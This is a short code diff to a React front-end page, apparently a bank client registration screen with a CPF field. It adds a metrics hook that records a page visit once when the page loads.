@@ -6,6 +6,7 @@ import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.pn
 import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
 import { Switch } from "@/components/ui/switch";
 import { useClientStatus } from "@/hooks/useClientStatus";
+import { useMetrics } from "@/hooks/useMetrics";
 import { useToast } from "@/hooks/use-toast";
 
 // Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
@@ -196,6 +197,7 @@ const processRegistrationResponse = async (response: Response, navigate: (path: 
 const Index = () => {
   const navigate = useNavigate();
   const clientStatus = useClientStatus();
+  const metrics = useMetrics();
   const { toast } = useToast();
   const [tab, setTab] = useState("fisica");
   const [cpf, setCpf] = useState("");
@@ -458,6 +460,14 @@ const Index = () => {
         return null;
     }
   };
+
+  // ---- Registrar visita automaticamente ----
+  useEffect(() => {
+    // Registrar visita apenas uma vez quando a página carregar
+    if (!metrics.isRegistered) {
+      metrics.registerVisit();
+    }
+  }, [metrics]);
 
   // Adicionar monitoramento de status do cliente
   useEffect(() => {
